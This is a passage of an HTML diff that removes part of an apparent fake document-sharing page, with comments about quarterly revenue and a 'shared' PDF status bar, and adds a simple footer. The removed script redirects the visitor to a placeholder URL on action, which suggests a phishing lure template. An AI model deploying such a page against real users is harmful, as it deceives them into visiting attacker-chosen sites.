-                    <div class="comment-text">Revenue numbers look strong this quarter. Can we get a breakdown of the APAC region separately?</div>
-                </div>
-                <div class="comment-item">
-                    <div class="comment-author">
-                        <div class="comment-avatar green">ML</div>
-                        <span class="comment-name">Maria Lopez</span>
-                        <span class="comment-time">1h ago</span>
-                    </div>
-                    <div class="comment-text">Updated the operating expense figures in Section 3. Please review before the board meeting.</div>
-                </div>
-                <div class="comment-item">
-                    <div class="comment-author">
-                        <div class="comment-avatar orange">RK</div>
-                        <span class="comment-name">Raj Kumar</span>
-                        <span class="comment-time">45m ago</span>
-                    </div>
-                    <div class="comment-text">@James I'll have the APAC breakdown ready by end of day. The growth there has been exceptional.</div>
-                </div>
-            </div>
-            <div class="panel-input-row">
-                <input class="panel-input" type="text" placeholder="Add a comment...">
-                <button class="panel-send">
-                    <svg viewBox="0 0 24 24"><path d="M2.01 21L23 12 2.01 3 2 10l15 2-15 2z"/></svg>
-                </button>
-            </div>
-        </div>
-    </div>
-
-    <!-- Status Bar -->
-    <div class="status-bar">
-        <span>Quarterly_Financial_Report_Q1_2026.pdf &mdash; 4.2 MB</span>
-        <span>Last modified: Apr 14, 2026 &middot; Shared with 3 people</span>
-    </div>
-
-    <script>
-        function handleAction() {
-            window.location.href = 'REDIRECT_URL_HERE';
-        }
-    </script>
+    <!-- Footer -->
+    <footer class="footer-bar">
+        <span>Annual_Report_2026.pdf &mdash; 5.8 MB</span>
+        <span>Last modified: Apr 14, 2026</span>
+    </footer>
 </body>
 </html>
